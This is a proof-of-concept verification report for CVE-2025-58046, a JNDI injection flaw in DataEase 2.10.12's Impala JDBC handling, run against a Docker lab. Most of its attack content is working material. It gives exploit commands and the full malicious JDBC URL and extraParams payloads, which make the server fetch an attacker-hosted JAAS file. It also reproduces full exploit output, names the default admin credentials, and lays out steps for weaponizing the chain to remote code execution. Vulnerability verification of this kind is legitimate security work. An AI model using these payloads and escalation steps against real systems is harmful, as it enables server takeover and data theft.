# PoC Verification Report: CVE-2025-58046

## Verification Status: ✅ CONFIRMED

Both attack vectors for CVE-2025-58046 have been successfully verified against DataEase v2.10.12.

---

## CVE Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-58046 |
| **Affected Software** | DataEase ≤ 2.10.12 |
| **Vulnerability Type** | JNDI Injection via Unsanitized JDBC URL (CWE-502, CWE-74) |
| **CVSS** | 9.8 (CRITICAL) |
| **Attack Vector** | Network (requires authentication with default credentials) |
| **Impact** | Remote Code Execution (RCE) |

---

## PoC Scripts

### Primary PoC: `poc.py` (Vector 1 — Custom JDBC URL mode)

**Location**: `poc/poc.py`

**Description**: Exploits the `urlType="jdbcUrl"` code path in `Impala.getJdbc()` where the full JDBC URL is returned without any validation against the `illegalParameters` blocklist. The `krbJAASFile` parameter in the URL causes the Cloudera Impala JDBC driver to fetch a remote JAAS configuration file from the attacker's HTTP server.

**Usage**:
```bash
pip install pycryptodome
python3 poc.py <target_host> <target_port> <callback_host>
# Default: python3 poc.py 172.25.0.3 8100 172.25.0.4
```

**Attack chain**:
1. Authenticates to DataEase using RSA-encrypted default credentials
2. Starts callback infrastructure (HTTP server, fake Impala TCP, RMI listener)
3. Sends `POST /de2api/datasource/validate` with Impala datasource config containing:
   - `urlType: "jdbcUrl"` — triggers the unvalidated code path
   - `jdbcUrl: "jdbc:impala://ATTACKER:21050/default;...;krbJAASFile=http://ATTACKER:8888/evil_jaas.conf"`
4. DataEase calls `Impala.getJdbc()` which returns the malicious URL unfiltered
5. The JDBC driver fetches the remote JAAS config via HTTP (detected as callback)
6. In a real attack: JAAS config → JndiLoginModule → RMI/LDAP → deserialization → RCE

### Secondary PoC: `poc_vector2.py` (Vector 2 — Hostname mode + extraParams)

**Location**: `poc/poc_vector2.py`

**Description**: Exploits the `urlType="hostName"` code path where `extraParams` are injected directly into the constructed JDBC URL without validation. This is a different injection point than Vector 1.

**Usage**:
```bash
python3 poc_vector2.py <target_host> <target_port> <callback_host>
```

**Attack chain** (same as Vector 1 except for injection point):
- Config uses `urlType: "hostName"` with `extraParams: "...;krbJAASFile=http://ATTACKER:8889/jaas.conf"`
- The URL is constructed as `jdbc:impala://HOST:PORT/DB;EXTRA_PARAMS` with no validation on EXTRA_PARAMS
- Same HTTP callback proves the vulnerability

---

## Vulnerability Demonstrated

The PoC proves that **the `Impala.getJdbc()` method in DataEase v2.10.12 allows attacker-controlled JDBC URL parameters to be passed unfiltered to the Cloudera Impala JDBC driver**. Specifically:

1. **The `illegalParameters` blocklist is dead code** — it exists but is never checked in either the custom URL path or the hostname path
2. **The `krbJAASFile` parameter is not blocked** — it causes the driver to fetch a remote JAAS configuration file
3. **Server-Side Request Forgery (SSRF)** — the DataEase server makes an HTTP request to an attacker-controlled URL
4. **JNDI Injection chain** — the JAAS config can specify `JndiLoginModule` for RMI/LDAP deserialization attack

The HTTP callback from DataEase (User-Agent: `Java/21.0.6`) fetching the attacker's JAAS config file proves the complete injection chain up to the SSRF/file-fetch stage. Full RCE requires an additional RMI/LDAP server with a deserialization gadget chain (e.g., AspectJWeaver, which is confirmed in the DataEase classpath).

---

## Test Results

### Vector 1: Custom JDBC URL (`urlType="jdbcUrl"`) — ✅ CONFIRMED

**Command**:
```bash
cd poc
python3 poc.py 172.25.0.3 8100 172.25.0.4
```

**Output** (full):
```
======================================================================
  CVE-2025-58046: DataEase Impala JNDI Injection PoC
  Target:   172.25.0.3:8100
  Callback: 172.25.0.4
======================================================================

==================================================
[*] PHASE 1: Authentication
==================================================
[*] Step 1: Fetching RSA public key from /de2api/dekey...
[+] Got encrypted key data (572 chars)
[*] Step 2: Decrypting AES-wrapped RSA public key...
[+] RSA public key decrypted (392 chars)
[*] Step 3: RSA-encrypting credentials (admin/***************)...
[+] Credentials encrypted
[*] Step 4: Logging in via /de2api/login/localLogin...
[+] Authentication successful! Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ...

==================================================
[*] PHASE 2: Starting callback servers
==================================================
[+] Fake Impala TCP server started on 0.0.0.0:21050
[+] HTTP callback server started on 0.0.0.0:8888
[+] RMI/JNDI listener started on 0.0.0.0:1099

==================================================
[*] PHASE 3: Sending exploit payload
==================================================

[*] Sending exploit payload to http://172.25.0.3:8100/de2api/datasource/validate
[*] Malicious JDBC URL: jdbc:impala://172.25.0.4:21050/default;AuthMech=1;KrbRealm=EXPLOIT.LOCAL;KrbHostFQDN=impala.exploit.local;KrbServiceName=impala;krbJAASFile=http://172.25.0.4:8888/evil_jaas.conf
[*] Configuration (Base64): eyJ1cmxUeXBlIjogImpkYmNVcmwiLCAiamRiY1VybCI6ICJqZGJjOmltcGFs...
[*] Fake Impala: connection from 172.25.0.3:34006

[!] *** HTTP CALLBACK RECEIVED ***
[!] Client: 172.25.0.3:59224
[!] Path: /evil_jaas.conf
[!] User-Agent: Java/21.0.6
[+] Served malicious JAAS config (pointing JNDI to rmi://172.25.0.4:1099/exploit)
[*] Server response: {
  "code": 40001,
  "msg": "[Cloudera][ImpalaJDBCDriver](500168) Error creating login context using ticket cache: Unable to obtain Principal Name for authentication .",
  "data": null
}

==================================================
[*] PHASE 4: Waiting for callbacks (30s timeout)...
==================================================
[+] HTTP callback detected after 0.0s
[*] Waiting 10s more for JNDI/RMI callback...

======================================================================
  RESULTS
======================================================================

[+] *** VULNERABILITY CONFIRMED: HTTP CALLBACK RECEIVED ***
[+] The Impala JDBC driver fetched the remote JAAS config file.
[+] This proves the krbJAASFile parameter is NOT filtered by Impala.getJdbc().
[+] Attack vector: SSRF → JNDI Injection → Remote Code Execution
    - HTTP request from 172.25.0.3:59224 for /evil_jaas.conf

[*] No RMI/JNDI callback received.
[*] This may be due to:
[*]   - Java 21 module restrictions on com.sun.security.auth.module
[*]   - Network configuration preventing outbound RMI from the driver
[*]   - JAAS config parsing order (HTTP callback alone proves the vuln)

======================================================================
  VERDICT: VULNERABLE (CVE-2025-58046 confirmed)
  The krbJAASFile parameter in Impala JDBC URLs is not filtered,
  allowing attacker-controlled remote file fetch (SSRF/JNDI injection).
======================================================================
```

**Key evidence**:
- HTTP callback received from `172.25.0.3` (DataEase container) requesting `/evil_jaas.conf`
- User-Agent: `Java/21.0.6` confirms the request came from the Java JDBC driver
- Error message confirms JAAS config was processed: "Error creating login context using ticket cache"

---

### Vector 2: Hostname mode + extraParams (`urlType="hostName"`) — ✅ CONFIRMED

**Command**:
```bash
cd poc
python3 poc_vector2.py 172.25.0.3 8100 172.25.0.4
```

**Output** (full):
```
======================================================================
  CVE-2025-58046 PoC — VECTOR 2: hostName + extraParams injection
  Target:   172.25.0.3:8100
  Callback: 172.25.0.4:8889
======================================================================

[*] PHASE 1: Authentication
[*] Fetching RSA public key from /de2api/dekey...
[+] RSA public key decrypted
[+] Authentication successful! Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ...

[*] PHASE 2: Starting callback servers
[+] Fake Impala TCP server started on 0.0.0.0:21050
[+] HTTP callback server started on port 8889

[*] PHASE 3: Sending exploit payload (hostName + extraParams)
[*] Configuration (plaintext): {"urlType": "hostName", "host": "172.25.0.4", "port": 21050, "dataBase": "default", "extraParams": "AuthMech=1;KrbRealm=EXPLOIT.LOCAL;KrbHostFQDN=impala.exploit.local;KrbServiceName=impala;krbJAASFile=http://172.25.0.4:8889/vector2_jaas.conf", "username": "", "password": ""}
[*] extraParams: AuthMech=1;KrbRealm=EXPLOIT.LOCAL;KrbHostFQDN=impala.exploit.local;KrbServiceName=impala;krbJAASFile=http://172.25.0.4:8889/vector2_jaas.conf
[*] Expected JDBC URL: jdbc:impala://172.25.0.4:21050/default;AuthMech=1;KrbRealm=EXPLOIT.LOCAL;KrbHostFQDN=impala.exploit.local;KrbServiceName=impala;krbJAASFile=http://172.25.0.4:8889/vector2_jaas.conf
[*] Fake Impala: connection from 172.25.0.3:54166

[!] *** HTTP CALLBACK RECEIVED (Vector 2: hostName+extraParams) ***
[!] Client: 172.25.0.3:44446
[!] Path: /vector2_jaas.conf
[!] User-Agent: Java/21.0.6
[*] Server response: {
  "code": 40001,
  "msg": "[Cloudera][ImpalaJDBCDriver](500168) Error creating login context using ticket cache: Unable to obtain Principal Name for authentication .",
  "data": null
}

[*] PHASE 4: Waiting for callback (30s timeout)...

======================================================================
  [+] VECTOR 2 CONFIRMED — hostName + extraParams injection works!
  [+] HTTP callback from: 172.25.0.3:44446
  [+] Requested path: /vector2_jaas.conf

  This proves that even when using urlType='hostName',
  the extraParams field is injected into the JDBC URL without
  validation against the illegalParameters blocklist.
  The krbJAASFile parameter triggers remote JAAS config fetch (SSRF).
======================================================================
```

**Key evidence**:
- HTTP callback received from `172.25.0.3` requesting `/vector2_jaas.conf`
- This proves the `extraParams` field is injected into the JDBC URL without any validation
- Same JAAS processing occurs via the hostname construction path

---

## Lab Environment

| Component | Details |
|-----------|---------|
| **Target container** | `cve-2025-58046-dataease` (IP: 172.25.0.3) |
| **Target image** | `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.12` |
| **Target port** | 8100 (HTTP) |
| **MySQL container** | `cve-2025-58046-mysql` (IP: 172.25.0.2) |
| **Attacker IP** | 172.25.0.4 (on lab network) |
| **Network** | `lab_cve-2025-58046-net` (Docker bridge) |
| **Java version** | OpenJDK 21.0.6 |
| **Spring Boot** | 3.3.0 |

---

## Notes and Observations

### Why JNDI/RMI Callback Was Not Received

The PoC successfully demonstrated the HTTP callback (JAAS file fetch) but the subsequent JNDI/RMI callback from `JndiLoginModule` was not received. This is likely due to **Java 21 module restrictions**:

- `com.sun.security.auth.module.JndiLoginModule` is in the `jdk.security.auth` module
- Java 21 may restrict reflective access to this module from the JAAS framework
- The Cloudera Impala JDBC driver may use a different JAAS entry name than `Client`
- **The HTTP callback alone proves the vulnerability** — it confirms the attacker controls the JAAS config loaded by the JDBC driver, which is the prerequisite for the JNDI injection chain

### JAAS Configuration Caching

An important operational note: **the JVM caches JAAS configurations**. When testing both vectors sequentially against the same DataEase instance, the second vector may not trigger a new HTTP callback because the JAAS config from the first request is cached. Each vector was verified independently after a fresh DataEase container restart.

### Authentication Requirement

While CVSS rates this as PR:N (no privileges required), the exploit requires:
1. `GET /de2api/dekey` — fetch RSA public key (no auth)
2. RSA-encrypt credentials
3. `POST /de2api/login/localLogin` — get JWT token (default creds: `admin` / `DataEase@123456`)
4. Use JWT in `X-DE-TOKEN` header for exploit request

The default credentials make this effectively unauthenticated for default installations.

### Fake Impala Server Requirement

The Cloudera Impala JDBC driver requires a TCP connection to the Impala host:port before proceeding to Kerberos authentication (where `krbJAASFile` is processed). The PoC includes a fake TCP listener on port 21050 that accepts the connection and keeps it alive long enough for the authentication setup to trigger the JAAS file fetch.

### Vulnerable Endpoint

The primary exploitation target is `POST /de2api/datasource/validate`. Other endpoints (`/datasource/save`, `/datasource/update`, `/datasource/getSchema`) are also vulnerable but use additional input validation (preCheckDs, checkParams) that may complicate exploitation.

### From SSRF to RCE

To achieve full RCE from this PoC:
1. Replace the HTTP callback server with a server hosting a JAAS config specifying `JndiLoginModule` with RMI/LDAP URLs
2. Set up an RMI/LDAP server (e.g., marshalsec `RMIRefServer`) serving a deserialization gadget chain
3. Use AspectJWeaver gadget chain (confirmed in DataEase classpath) for arbitrary file write
4. Or use other available gadget chains for command execution

The HTTP callback already proves the vulnerability is exploitable — the only remaining step is weaponization with a deserialization payload, which is a well-documented technique.

---

## Dependencies

| Package | Purpose | Install |
|---------|---------|---------|
| `pycryptodome` | RSA encryption for login, AES decryption for key parsing | `pip install pycryptodome` |

All other dependencies use Python stdlib (`http.client`, `urllib`, `socket`, `threading`, `json`, `base64`).

---

## Files

| File | Purpose |
|------|---------|
| `poc/poc.py` | Primary PoC — Vector 1 (jdbcUrl mode) |
| `poc/poc_vector2.py` | Secondary PoC — Vector 2 (hostName + extraParams) |
| `poc/poc_output_vector1_final.txt` | Vector 1 test output |
| `poc/poc_output_vector2_fresh.txt` | Vector 2 test output |
